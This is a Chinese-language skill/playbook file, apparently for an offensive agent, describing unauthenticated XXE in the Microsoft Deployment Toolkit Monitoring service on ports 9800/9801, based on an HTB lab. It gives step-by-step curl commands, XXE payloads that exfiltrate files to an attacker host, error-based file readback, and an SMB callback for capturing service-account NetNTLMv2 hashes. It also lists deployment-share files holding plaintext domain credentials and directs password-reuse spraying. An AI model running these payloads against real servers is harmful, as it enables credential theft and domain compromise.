---
name: 'mdt-monitoring-xxe'
description: 'MDT/WDS Monitoring 服务未授权 XXE：9800/9801 无鉴权 CRUD + Settings 列延迟解析 ⇒ 任意文件读取（含报错回显通道）与部署共享凭据狩猎。Scaffold Hard 来源。（检索词：mdt monitoring xxe）'
whenToUse: '目标开放 9800/9801、或 http.sys 端口返回 503、或发现 Microsoft Deployment Toolkit / Windows Deployment Services 痕迹时使用。'
metadata: { domain: ad-win, tier: T2 }
---

# MDT Monitoring 服务未授权 XXE（任意文件读取）

> 来源：Scaffold HTB (Hard)。微软 2026-01 因此问题「立即退役 MDT」，同源未授权暴露对应 CVE-2026-0386。

## 漏洞形状（先看形状，再谈命令）

一个 http.sys 承载、**对调用方不做任何鉴权**（通配 URL 保留 + 开放全部 CRUD）的 WCF/ODATA 服务，
把客户端 POST 进来的字符串**原样存库**，随后在 `GetSettings` 时**再取出来交给 XML 解析器**：

```
客户端 → PostEvent(建条目) → MERGE 写入 Settings 列(含外部实体的 XML)
       → GetSettings (服务端 XML 解析) → 解析器按 SYSTEM/外部 DTD 语义取资源
```

危险操作是**延迟触发**的第二次解析：写入与触发必须分两步，且解析前服务端不校验内容。

## 🔴 识别信号

- 端口 **9800(EventPort) / 9801(DataPort)** 开放，但 `GET /` 返回 **503**（http.sys 已保留 URL、应用未响应）
- 正确路径是 `/MDTMonitorEvent/`（WCF，支持 `?wsdl`）与 `/MDTMonitorData/`（ODATA，`$metadata` 会列出实体集 Computers / ComputerIdentities / NextIDs）
- 服务账户通常是**专用服务账户而非 SYSTEM**（可读文件范围 ≈ 普通域用户）

## ✅ 利用流程（三段式）

```bash
# 1) 建条目：拿到【服务端返回】的 guid（不是你传进去的 id）
curl -s "http://DC:9800/MDTMonitorEvent/PostEvent?uniqueID=&computerName=X&messageID=41000&severity=1&stepName=T&currentStep=1&totalSteps=1&id=$(uuidgen)&message=t&dartIP=&dartPort=&dartTicket=&vmHost=&vmName="

# 2) 取数字 ID
curl -s "http://DC:9801/MDTMonitorData/Computers?\$filter=UniqueID eq guid'<GUID>'"

# 3) 写 Settings，再触发解析
curl -s -X MERGE "http://DC:9801/MDTMonitorData/Computers(<ID>)" \
     -H 'Content-Type: application/json' -d '{"Settings":"<XXE XML>"}'
curl -s "http://DC:9800/MDTMonitorEvent/GetSettings?uniqueID=<GUID>"
```

**通道 A：OOB 外带**（.NET 会 URL 编码空格/换行，适合 URI-safe 文本如 INI）

```xml
<?xml version="1.0"?><!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///PATH">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATT:PORT/?d=%file;'>">
%eval;%exfil;]><Settings>x</Settings>
```

**通道 B：报错回显**（★ 通道 A 失败时的主力；服务端开了 includeExceptionDetailInFaults）

```xml
<?xml version="1.0"?><!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///PATH">
<!ENTITY % eval "<!ENTITY &#x25; e SYSTEM 'file:///x/%file;'>">
%eval;%e;]><Settings>x</Settings>
```

→ HTTP 400 页面里 `The exception message is '…'` 直接带出**完整文件内容**（含 `#`、单行文件同样可读）。

## 凭据狩猎点（按命中率排序）

```
<MDT 共享>/Control/Bootstrap.ini         # 部署引导账户：UserID / UserPassword 明文
<MDT 共享>/Control/CustomSettings.ini    # 域加入凭据：DomainAdmin / DomainAdminPassword
.../Microsoft Deployment Toolkit/Monitor/Microsoft.BDD.MonitorService.exe.config   # 连接串、端口、数据目录
<MDT 共享>/Control/TaskSequences.xml 等  # 空盘时内容是 <tss />，别误判为"读失败"
```

> 读到明文口令后**立刻做全账户口令复用矩阵**（含大小写与 `0`/`o` 变体）——见 `credential-spraying-password-reuse`。

## 顺带拿服务账户哈希（识别服务身份）

```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "\\ATT\share">]><Settings>&xxe;</Settings>
```

写入后触发 `GetSettings` ⇒ 服务端主动外连攻击机 ⇒ Responder 抓到**服务账户**的 NetNTLMv2。
注意源侧可能强制 SMB 签名（中继未必可用），但足以确认"服务以谁运行"。

## ⚠️ 坑（每条都踩过）

1. **每次读取使用唯一 DTD 文件名**。同一 URL 会被 .NET 缓存 ⇒ 反复读到上一次的文件内容。
2. **先 `ss -tlnp` 确认 DTD 端口空闲**；残留进程占用会让整轮批量扫描静默失败。
3. **每个文件用新条目**：同一 GUID 的 Settings 被消费后，再次 `GetSettings` 常无回显。
4. 通道 A 对含 `#`、引号或超长内容会失败（URI 非法/超长）⇒ 换通道 B。
5. 通道 B 只对**单行**内容回显（多行内容报 Illegal characters in path，不带内容）。
6. 服务账户**不是管理员**：`applicationHost.config`、`C:\Windows\...` 会 Access denied，别据此判断服务异常。
7. **IPv6 也要全端口扫描**：本机 9800/9801 在 IPv4 首扫缺席，IPv6 复扫才现形。

## 验证标准

- 先用**已知内容**的文件（如 `C:/Windows/win.ini`）证明通道成立，再读未知名文件。
- 判"存在但读不到" ⇒ 报 Access denied；判"不存在" ⇒ 报 Could not find file；三态语义与目录枚举法见 `dotnet-file-oracle`。

**Why:** 只回 503 的端口极易被跳过，实际是 http.sys 保留 + 路径不对；这一跳往往是整条链的入口。
**How to apply:** 扫到 9800/9801 或 WDS/MDT 痕迹时，先 `/MDTMonitorEvent/?wsdl` 与 `/MDTMonitorData/$metadata` 定位，再走三段式；读到配置后立刻做口令复用矩阵。
